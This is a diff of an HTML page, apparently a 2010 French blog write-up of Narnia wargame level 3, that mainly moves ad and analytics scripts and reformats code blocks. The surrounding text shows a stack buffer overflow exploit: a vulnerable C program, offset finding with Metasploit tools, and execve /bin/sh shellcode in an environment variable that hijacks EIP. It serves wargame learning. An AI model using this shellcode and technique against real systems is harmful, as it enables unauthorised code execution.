@@ -12,26 +12,6 @@
   <link rel="stylesheet" href="/assets/css/main.css">
   <link rel="canonical" href="/binholic/2010/08/01/wargame-narnia-at-intrudednet-level-3.html">
   <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
-
-  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({
-          google_ad_client: "ca-pub-9302170278788846",
-          enable_page_level_ads: true
-     });
-</script>
-
-
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-16686496-2');
-</script>
-
 </head>
 
 
@@ -166,7 +146,7 @@
 #include &lt;stdlib.h&gt;
 #include &lt;string.h&gt;
 </span>
-<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
         <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
 
         <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
@@ -178,7 +158,8 @@
         <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
 
         <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Ok, un bof tout ce qu’il y a de plus classique dans les wargames.
 Rien de particulier dans le code assembleur si ce n’est l’habituel calcul d’offset sous GDB.
@@ -190,7 +171,8 @@ On génére notre pattern avec metasploit :</p>
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre>votrepseudo@votremachine <span class="nv">$ </span>msf/tools/pattern_create 140
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae</pre></td></tr></tbody></table></code></pre></figure>
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
@@ -261,7 +243,8 @@ ss             0x7b 123
 ds             0x7b 123
 es             0x7b 123
 fs             0x0 0
-gs             0x33 51</pre></td></tr></tbody></table></code></pre></figure>
+gs             0x33 51
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Ok on a re-écrit ebp avec “e5Ae”.</p>
 
@@ -270,7 +253,8 @@ gs             0x33 51</pre></td></tr></tbody></table></code></pre></figure>
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre>msf/tools/pattern_offset e5Ae
-136</pre></td></tr></tbody></table></code></pre></figure>
+136
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Donc au bouts de 136 bytes on écrit EBP, EIP est donc re-écrit au bout de 140 octets.</p>
 
@@ -324,7 +308,8 @@ gs             0x33 51</pre></td></tr></tbody></table></code></pre></figure>
                 <span class="n">printf</span> <span class="p">(</span><span class="s">"%s is located at %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">addr</span><span class="p">);</span>
 
         <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Maintenant let’s sploit!</p>
 
@@ -335,7 +320,8 @@ gs             0x33 51</pre></td></tr></tbody></table></code></pre></figure>
 </pre></td><td class="code"><pre>level3@narnia:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">SC</span><span class="o">=</span><span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90" * 128 + "\xb0\x0b\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"'</span><span class="sb">`</span>
 level3@narnia:~<span class="nv">$ </span>/tmp/getenv SC
 SC is located at 0xbffffe94
-/wargame/level3 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "A" * 140 + "\x94\xfe\xff\xbf"'</span><span class="sb">`</span></pre></td></tr></tbody></table></code></pre></figure>
+/wargame/level3 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "A" * 140 + "\x94\xfe\xff\xbf"'</span><span class="sb">`</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Have fun ;).</p>
 
@@ -444,6 +430,26 @@ SC is located at 0xbffffe94
   </div>
 
 </footer>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-9302170278788846",
+          enable_page_level_ads: true
+     });
+</script>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-16686496-2');
+</script>
+
 
 
   </body>
